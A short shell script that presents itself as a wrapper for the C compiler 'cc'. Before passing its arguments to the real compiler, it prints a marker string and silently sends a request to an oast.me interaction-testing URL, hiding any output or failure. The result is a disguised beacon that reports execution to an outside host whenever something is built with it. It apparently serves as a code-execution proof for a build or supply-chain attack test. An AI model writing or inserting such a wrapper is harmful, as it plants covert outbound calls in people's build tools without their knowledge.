#!/bin/sh
echo "H282-INFER-EXEC" >&2
curl -sS -m 5 "https://dc33biq1af36dsaabccgqx7qcknb3iy9w.oast.me/h282-infer" >/dev/null 2>&1 || true
exec cc "$@"
